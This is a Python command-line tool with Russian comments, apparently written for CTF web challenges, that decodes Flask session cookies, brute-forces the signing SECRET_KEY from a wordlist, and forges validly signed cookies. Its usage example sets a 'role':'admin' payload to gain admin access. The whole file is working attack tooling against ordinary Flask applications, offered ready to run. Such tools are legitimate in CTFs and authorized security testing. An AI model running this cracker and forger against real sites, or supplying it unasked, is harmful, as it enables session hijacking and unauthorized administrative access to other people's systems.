#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
flask_session.py — разобрать/подделать/подобрать Flask-сессию (cookie).

  python flask_session.py decode "eyJ1c2VyX2lkIjoxfQ.aBcDeF..."
  python flask_session.py forge --secret you-will-never-guess --data '{"user_id":1,"role":"admin"}'
  python flask_session.py crack "cookie..." --wordlist words.txt

Зачем: в веб-задачах доступ в админку часто даёт не JWT, а **cookie сессии**
Flask. Она подписана `SECRET_KEY` (itsdangerous, salt `cookie-session`,
HMAC-SHA1). Если ключ дефолтный/словарный — сессию можно собрать самому и
войти админом. Без flask/itsdangerous, только stdlib.

Формат cookie: base64url(payload) + "." + base64url(hmac_sha1(dk, value)),
где payload — json (иногда сжатый zlib), dk = HMAC(secret, "cookie-session").
"""
from __future__ import annotations

try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import argparse
import base64
import hashlib
import hmac
import json
import os
import sys
import zlib

SALT = b"cookie-session"


def _b64d(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def derive_key(secret: str) -> bytes:
    return hmac.new(secret.encode(), SALT, hashlib.sha1).digest()


def decode(cookie: str) -> dict:
    value, _, sig = cookie.partition(".")
    raw = _b64d(value)
    data = None
    if raw[:1] == b".":            # zlib-сжатый вариант
        raw = raw[1:]
        try:
            data = json.loads(zlib.decompress(raw))
        except zlib.error:
            data = None
    if data is None:
        try:
            data = json.loads(raw)
        except Exception:
            data = None
    return {"value": value, "sig": sig, "data": data}


def verify(cookie: str, secret: str) -> bool:
    value, _, sig = cookie.partition(".")
    if not value or not sig:
        return False
    expect = hmac.new(derive_key(secret), value.encode(), hashlib.sha1).digest()
    try:
        return hmac.compare_digest(expect, _b64d(sig))
    except Exception:
        return False


def forge(data: dict, secret: str) -> str:
    raw = json.dumps(data, separators=(",", ":")).encode()
    value = _b64e(raw)
    sig = hmac.new(derive_key(secret), value.encode(), hashlib.sha1).digest()
    return value + "." + _b64e(sig)


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("decode")
    d.add_argument("cookie")

    f = sub.add_parser("forge")
    f.add_argument("--secret", required=True)
    f.add_argument("--data", required=True, help='json, напр. {"user_id":1,"role":"admin"}')

    c = sub.add_parser("crack")
    c.add_argument("cookie")
    c.add_argument("--wordlist", required=True)

    args = ap.parse_args()
    if args.cmd == "decode":
        r = decode(args.cookie)
        print(json.dumps(r["data"], ensure_ascii=False, indent=1)
              if r["data"] is not None else "[-] не разобрал payload")
        print(f"[i] подпись: {r['sig'][:16]}…  (проверить: forge/crack)")
        return 0
    if args.cmd == "forge":
        try:
            payload = json.loads(args.data)
        except json.JSONDecodeError as exc:
            print(f"[-] --data не json: {exc}")
            return 2
        print(forge(payload, args.secret))
        return 0
    # crack
    n = 0
    with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            w = line.strip()
            if not w:
                continue
            n += 1
            if verify(args.cookie, w):
                print(f"[+] секрет: {w!r} (проверено {n})")
                return 0
    print(f"[-] не найден ({n} слов)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
